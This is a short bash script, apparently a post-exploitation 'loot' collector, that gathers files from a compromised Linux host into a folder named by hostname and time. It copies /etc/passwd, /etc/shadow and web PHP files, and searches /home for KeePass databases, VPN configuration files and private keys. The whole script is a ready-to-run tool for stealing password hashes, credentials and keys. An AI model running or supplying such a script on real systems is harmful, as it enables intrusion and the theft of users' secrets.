#!/bin/bash
LOOT=~/hacking_tools/loot/$(hostname)_$(date +%F_%H-%M)
mkdir -p "$LOOT"

cp /etc/passwd "$LOOT/"
cp /etc/shadow "$LOOT/" 2>/dev/null
cp /var/www/html/*.php "$LOOT/" 2>/dev/null
find /home -name '*.kdbx' -o -name '*.ovpn' -o -name '*.pem' -exec cp {} "$LOOT/" \;

echo "[+] Loot saved to $LOOT"

